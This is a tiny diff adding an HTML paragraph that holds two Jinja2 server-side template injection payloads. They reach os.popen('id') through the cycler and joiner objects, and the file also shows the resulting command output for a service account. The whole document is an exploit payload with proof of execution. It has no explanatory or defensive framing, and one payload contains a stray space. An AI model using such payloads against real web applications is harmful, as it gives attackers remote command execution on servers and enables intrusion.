@@ -1,0 +1,6 @@
+<p>{cycler.__init__.__globals__.os.popen("id").read()}
+{joiner.__init__.__ globals__.os.popen("id").read()}
+
+uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
+
+</p>
